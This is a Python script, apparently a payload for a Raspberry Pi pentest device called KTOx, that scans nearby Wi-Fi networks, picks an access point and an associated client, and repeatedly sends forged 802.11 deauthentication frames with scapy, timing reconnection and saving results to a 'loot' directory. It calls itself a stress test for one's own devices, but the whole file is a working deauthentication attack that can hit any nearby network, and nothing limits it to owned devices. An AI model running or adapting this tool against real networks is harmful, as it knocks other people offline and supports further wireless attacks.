#!/usr/bin/env python3
"""
KTOx payload – WiFi Reconnect Stress Test
=============================================
Actively test a device's Wi‑Fi driver/stack by repeatedly deauthenticating it
from a selected AP and measuring reconnection time. Designed for lab/testing
against your own devices.

What it does
- Select wireless interface (prefers wlan1) and enter monitor mode
- Scan and select target AP (BSSID/ESSID/channel)
- Discover and select a client station (MAC) associated with the AP
- Run N cycles of: deauth burst -> measure time until reassociation
- Show live metrics (last/avg/min/max; success rate) and save a report to loot

Requirements
- Root, scapy, injection-capable adapter
- This performs 802.11 deauth frames (test only against devices you own)
"""
import os
import sys
import time
import json
import signal
import threading
import subprocess
from collections import deque

# KTOx pathing
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
_PAYLOADS_DIR = os.path.abspath(os.path.join(BASE_DIR, '..'))
if _PAYLOADS_DIR not in sys.path:
    sys.path.insert(0, _PAYLOADS_DIR)
if os.path.isdir('/root/KTOx') and '/root/KTOx' not in sys.path:
    sys.path.insert(0, '/root/KTOx')

# Hardware/UI imports
try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
except Exception as e:
    print(f"[ERROR] LCD/GPIO deps missing: {e}", file=sys.stderr)
    sys.exit(1)

# WiFi helpers
def get_available_interfaces():
    try:
        import re as _re
        out = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5).stdout
        return _re.findall(r'Interface\s+(\S+)', out)
    except Exception:
        return []

try:
    import monitor_mode_helper
    WIFI_OK = True
except Exception:
    WIFI_OK = False
    class monitor_mode_helper:
        @staticmethod
        def activate_monitor_mode(iface): return None
        @staticmethod
        def deactivate_monitor_mode(iface): return False

# Scapy for 802.11
try:
    from scapy.all import sniff, sendp, Dot11, Dot11Deauth
    from scapy.layers.dot11 import RadioTap
    SCAPY_OK = True
except Exception:
    SCAPY_OK = False

WIDTH, HEIGHT = 128, 128

# Load pins
PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}

def _find_gui_conf():
    cands = [
        os.path.join(os.getcwd(), 'gui_conf.json'),
        os.path.join('/root/KTOx', 'gui_conf.json'),
        os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'KTOx', 'gui_conf.json'),
    ]
    for sp in list(sys.path):
        try:
            if sp and os.path.basename(sp) == 'KTOx':
                cands.append(os.path.join(sp, 'gui_conf.json'))
        except Exception:
            pass
    for p in cands:
        if os.path.exists(p): return p
    return None

try:
    cfg = _find_gui_conf()
    if cfg:
        with open(cfg,'r') as f: data = json.load(f)
        mp = data.get('PINS', {})
        PINS = {
            "UP": mp.get("KEY_UP_PIN", PINS["UP"]),
            "DOWN": mp.get("KEY_DOWN_PIN", PINS["DOWN"]),
            "LEFT": mp.get("KEY_LEFT_PIN", PINS["LEFT"]),
            "RIGHT": mp.get("KEY_RIGHT_PIN", PINS["RIGHT"]),
            "OK": mp.get("KEY_PRESS_PIN", PINS["OK"]),
            "KEY1": mp.get("KEY1_PIN", PINS["KEY1"]),
            "KEY2": mp.get("KEY2_PIN", PINS["KEY2"]),
            "KEY3": mp.get("KEY3_PIN", PINS["KEY3"]),
        }
except Exception:
    pass

GPIO.setmode(GPIO.BCM)
for p in PINS.values():
    GPIO.setup(p, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
IMG = Image.new("RGB", (WIDTH, HEIGHT), "black")
DRAW = ImageDraw.Draw(IMG)
try:
    FONT_TITLE = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf', 12)
except Exception:
    FONT_TITLE = ImageFont.load_default()
FONT = ImageFont.load_default()

RUN = True

WIFI_IFACE = None
MON_IFACE = None
TARGET_AP = {"bssid": None, "essid": None, "channel": None}
TARGET_STA = None
CYCLES = 10

RESULTS = {
    "times": [],
    "success": 0,
    "fail": 0,
}

KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(BASE_DIR, '..', '..'))
LOOT_DIR = os.path.join(KTOX_ROOT, 'loot', 'WiFi_Reconnect_Test')
os.makedirs(LOOT_DIR, exist_ok=True)

# ---------------- UI helpers ----------------

def draw(lines_top, lines_bottom=None):
    IMG.paste((0,0,0), [0,0,WIDTH,HEIGHT])
    y = 3
    for s in lines_top:
        DRAW.text((4,y), s, font=FONT_TITLE, fill='#00FF00')
        y += 14
    if lines_bottom:
        y = HEIGHT - 15*len(lines_bottom) - 2
        for s in lines_bottom:
            DRAW.text((4,y), s, font=FONT, fill='#AAAAAA')
            y += 13
    LCD.LCD_ShowImage(IMG, 0, 0)

# ---------------- Discovery ----------------

APS = {}  # bssid -> {essid, channel, last}
STAS = set()

def sniff_aps(timeout=6):
    APS.clear()
    end = time.time() + timeout
    def cb(pkt):
        if not pkt.haslayer(Dot11):
            return
        d = pkt[Dot11]
        bssid = d.addr3
        # beacons/resp
        if pkt.type == 0 and pkt.subtype in (8,5):
            essid = None
            chan = None
            try:
                essid = pkt.info.decode(errors='ignore') if hasattr(pkt,'info') else None
            except Exception:
                essid = None
            # parse DS Parameter Set (channel)
            try:
                from scapy.layers.dot11 import Dot11Elt
                elt = pkt.getlayer(Dot11Elt)
                while elt is not None:
                    if getattr(elt, 'ID', None) == 3 and elt.info:
                        chan = int(elt.info[0])
                        break
                    elt = elt.payload.getlayer(Dot11Elt)
            except Exception:
                chan = None
            if bssid:
                APS[bssid] = {"essid": essid or 'Hidden', "channel": chan, "last": time.time()}
    sniff(iface=MON_IFACE, prn=cb, store=0, timeout=timeout)

CLIENTS_AP = set()

def sniff_clients_for_ap(bssid, timeout=8):
    CLIENTS_AP.clear()
    def cb(pkt):
        if not pkt.haslayer(Dot11):
            return
        d = pkt[Dot11]
        if d.addr3 == bssid:
            # data mgmt frames from client to AP
            if d.addr2 and d.addr2 != bssid:
                CLIENTS_AP.add(d.addr2)
    sniff(iface=MON_IFACE, prn=cb, store=0, timeout=timeout)

# ---------------- Test logic ----------------

def deauth_once(bssid, sta, count=20, inter=0.01):
    dot11 = Dot11(type=0, subtype=12, addr1=sta, addr2=bssid, addr3=bssid)
    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(frame, iface=MON_IFACE, count=count, inter=inter, verbose=0)

def wait_for_reassoc(bssid, sta, timeout=10.0):
    start = time.time()
    hit = [False]
    def cb(pkt):
        if not pkt.haslayer(Dot11):
            return
        d = pkt[Dot11]
        # look for client frames to AP after deauth
        if d.addr2 == sta and d.addr3 == bssid:
            hit[0] = True
            return True
        return False
    sniff(iface=MON_IFACE, prn=cb, store=0, timeout=timeout, stop_filter=lambda p: hit[0])
    return (time.time() - start) if hit[0] else None

# ---------------- Main ----------------

def cleanup(*_):
    global RUN
    RUN = False
signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

if __name__ == '__main__':
    try:
        if os.geteuid() != 0:
            draw(["Root required"], ["Run as sudo"])
            time.sleep(3); sys.exit(1)
        if not SCAPY_OK or not WIFI_OK:
            draw(["Missing deps"], ["scapy/wifi helpers"])
            time.sleep(3); sys.exit(1)

        # Interface select
        ifaces = [i for i in get_available_interfaces() if i.startswith('wlan')]
        if 'wlan1' in ifaces:
            ifaces.remove('wlan1'); ifaces.insert(0,'wlan1')
        if not ifaces:
            draw(["No WiFi interfaces"], None); time.sleep(3); sys.exit(1)
        sel = 0; last=0; db=0.25
        while RUN:
            draw(["Select Interface", ifaces[sel]],["OK=Confirm LEFT=Exit"])
            now=time.time()
            if GPIO.input(PINS['UP'])==0 and now-last>db: last=now; sel=(sel-1)%len(ifaces)
            elif GPIO.input(PINS['DOWN'])==0 and now-last>db: last=now; sel=(sel+1)%len(ifaces)
            elif GPIO.input(PINS['OK'])==0 and now-last>db: last=now; WIFI_IFACE=ifaces[sel]; break
            elif GPIO.input(PINS['LEFT'])==0 and now-last>db: sys.exit(0)
            time.sleep(0.05)

        # Monitor mode
        draw([f"Monitor mode", f"on {WIFI_IFACE}..."], None)
        MON_IFACE = monitor_mode_helper.activate_monitor_mode(WIFI_IFACE)
        if not MON_IFACE:
            draw(["Monitor enable failed"], None); time.sleep(3); sys.exit(1)
        time.sleep(0.5)

        # Scan APs
        draw(["Scanning APs..."],["KEY3=Exit"])
        sniff_aps(timeout=6)
        ap_list = list(APS.items())
        if not ap_list:
            draw(["No APs found"], None); time.sleep(3); sys.exit(1)
        sel=0; last=0
        while RUN:
            bssid, meta = ap_list[sel]
            ch = meta.get('channel')
            title = f"AP: {meta['essid'][:16]}"; sub=f"{bssid[-8:]} ch:{ch if ch else '?'}"
            draw([title, sub],["UP/DN=Select OK=Pick LEFT=Back"])
            now=time.time()
            if GPIO.input(PINS['UP'])==0 and now-last>db: last=now; sel=(sel-1)%len(ap_list)
            elif GPIO.input(PINS['DOWN'])==0 and now-last>db: last=now; sel=(sel+1)%len(ap_list)
            elif GPIO.input(PINS['OK'])==0 and now-last>db:
                last=now
                TARGET_AP['bssid']=ap_list[sel][0]
                TARGET_AP['essid']=ap_list[sel][1]['essid']
                TARGET_AP['channel']=ap_list[sel][1].get('channel')
                # try setting channel on monitor interface for reliability
                try:
                    if TARGET_AP['channel']:
                        subprocess.run(['sudo','iw','dev', MON_IFACE, 'set', 'channel', str(TARGET_AP['channel'])], check=False)
                except Exception:
                    try:
                        if TARGET_AP['channel']:
                            subprocess.run(['sudo','iwconfig', MON_IFACE, 'channel', str(TARGET_AP['channel'])], check=False)
                    except Exception:
                        pass
                break
            elif GPIO.input(PINS['LEFT'])==0 and now-last>db: sys.exit(0)
            time.sleep(0.05)

        # Discover clients for AP
        draw(["Discovering clients", TARGET_AP['essid'][:16]],["Please wait..."])
        # ensure channel is set before client sniff
        try:
            if TARGET_AP.get('channel'):
                subprocess.run(['sudo','iw','dev', MON_IFACE, 'set', 'channel', str(TARGET_AP['channel'])], check=False)
        except Exception:
            pass
        sniff_clients_for_ap(TARGET_AP['bssid'], timeout=8)
        stas = list(CLIENTS_AP)
        if not stas:
            draw(["No clients found"],["Try again later"]); time.sleep(3); sys.exit(0)
        sel=0; last=0
        while RUN:
            sta = stas[sel]
            draw(["Select Client", sta],["UP/DN=Select OK=Pick LEFT=Back"])
            now=time.time()
            if GPIO.input(PINS['UP'])==0 and now-last>db: last=now; sel=(sel-1)%len(stas)
            elif GPIO.input(PINS['DOWN'])==0 and now-last>db: last=now; sel=(sel+1)%len(stas)
            elif GPIO.input(PINS['OK'])==0 and now-last>db:
                last=now; TARGET_STA=stas[sel]; break
            elif GPIO.input(PINS['LEFT'])==0 and now-last>db: sys.exit(0)
            time.sleep(0.05)

        # Test
        results = []
        success=fail=0
        for i in range(CYCLES):
            if not RUN: break
            draw([f"Cycle {i+1}/{CYCLES}", "Deauthing..."],["KEY3=Exit"])
            deauth_once(TARGET_AP['bssid'], TARGET_STA, count=20, inter=0.01)
            draw([f"Cycle {i+1}/{CYCLES}", "Waiting assoc..."], None)
            t = wait_for_reassoc(TARGET_AP['bssid'], TARGET_STA, timeout=10.0)
            if t is not None:
                success+=1; results.append(t)
                draw([f"Reassoc in {t:.2f}s"],["Continuing..."])
            else:
                fail+=1; results.append(None)
                draw(["No reassoc (10s)"],["Continuing..."])
            time.sleep(1)

        # Summary
        avg = sum([x for x in results if x is not None])/max(1,len([x for x in results if x is not None]))
        mn = min([x for x in results if x is not None], default=0.0)
        mx = max([x for x in results if x is not None], default=0.0)
        draw(["Test Complete", f"OK:{success} FAIL:{fail}", f"avg:{avg:.2f}s min:{mn:.2f}s", f"max:{mx:.2f}s"],["Press any key..."])
        # Save report
        ts = time.strftime('%Y-%m-%d_%H%M%S')
        report = os.path.join(LOOT_DIR, f"reconnect_{TARGET_STA.replace(':','')}_{ts}.txt")
        try:
            with open(report,'w') as f:
                f.write(f"AP: {TARGET_AP['essid']} {TARGET_AP['bssid']}\n")
                f.write(f"STA: {TARGET_STA}\n")
                f.write(f"Cycles: {CYCLES}\n")
                f.write(f"Success: {success} Fail: {fail}\n")
                f.write(f"Times: {['{:.2f}'.format(x) if x is not None else 'None' for x in results]}\n")
                f.write(f"Avg: {avg:.2f} Min: {mn:.2f} Max: {mx:.2f}\n")
        except Exception:
            pass
        # Wait for any key
        last=0
        while RUN:
            now=time.time()
            if any(GPIO.input(p)==0 for p in PINS.values()) and now-last>db:
                break
            time.sleep(0.05)

    except SystemExit:
        pass
    except Exception as e:
        try:
            with open('/tmp/wifi_reconnect_stress_test_error.log','w') as f:
                import traceback
                f.write(f"FATAL: {e}\n"); traceback.print_exc(file=f)
        except Exception:
            pass
    finally:
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        try:
            if MON_IFACE:
                monitor_mode_helper.deactivate_monitor_mode(MON_IFACE)
        except Exception:
            pass
        try:
            GPIO.cleanup()
        except Exception:
            pass
